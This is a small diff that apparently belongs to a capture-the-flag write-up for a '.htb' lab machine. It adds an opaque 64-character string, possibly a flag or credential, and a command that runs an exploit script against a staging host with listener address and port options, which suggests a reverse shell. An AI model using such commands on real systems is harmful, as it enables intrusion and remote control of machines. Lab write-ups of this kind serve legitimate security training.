@@ -1,9 +1,13 @@
 ```
-
+BnpBMqo9hlO3BkedwfZlKcxnkuyKuLVsgNAqn2QzMgqWyL6TXraAAQCNVGmRtzhl
 ```
 
 ```
-
+python3 main.py \
+  -u http://staging.silentium.htb \
+  -e ben@silentium.htb \
+  --lhost 10.10.17.59 \
+  --lport 4444
 ```
 
 ```
